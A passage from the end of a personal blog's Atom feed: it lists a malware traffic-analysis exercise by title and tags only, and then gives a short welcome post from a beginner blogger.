    
    
    <summary type="html">&lt;h1 id=&quot;2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER&quot;&gt;&lt;a href=&quot;#2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER&quot; class=&quot;headerlink&quot; title=&quot;2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER&quot;&gt;&lt;/a&gt;2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Welcome to My Blog</title>
    <link href="https://2in9ya2.github.io/first/"/>
    <id>https://2in9ya2.github.io/first/</id>
    <published>2024-04-09T16:00:00.000Z</published>
    <updated>2025-08-25T07:52:22.813Z</updated>
    
    <content type="html"><![CDATA[<div style="text-align: justify;">Welcome to my first blog! I'm thrilled to embark on this journey where I'll be sharing my study experiences, code snippets, and insights into life. It's my pleasure to meet you all! Stay tuned as I continuously improve and enhance the functionality of this blog. <br>As a beginner, if you have any questions or suggestions, please contacting me at any time via <a href="https://twitter.com/JazzNnYs">twitter</a>. I will do my best to provide support.</div>]]></content>
    
    
      
      
    <summary type="html">&lt;div style=&quot;text-align: justify;&quot;&gt;
Welcome to my first blog! I&#39;m thrilled to embark on this journey where I&#39;ll be sharing my study experienc</summary>
      
    
    
    
    <category term="explanation" scheme="https://2in9ya2.github.io/categories/explanation/"/>
    
    
  </entry>
  
</feed>
